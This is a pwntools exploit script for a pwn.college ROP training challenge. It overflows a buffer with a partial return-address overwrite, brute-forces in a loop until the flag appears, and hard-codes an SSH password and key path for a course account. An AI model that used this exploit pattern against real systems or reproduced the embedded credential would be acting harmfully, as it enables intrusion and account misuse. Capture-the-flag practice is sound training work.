from pwn import *

e = ELF('./babyrop_level11_testing1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

while 1:
    try:
        p = s.run('/babyrop_level11_testing1')

        pay = b'A' * 0x40
        pay += b'\x01\x85'

        p.sendafter(b'.\n\n',pay)

        p.recvuntil(b'Goodbye!')
        p.recvuntil(b'flag: ')
        print(p.recv().decode().strip())
        p.interactive()

        break
    except:
        pass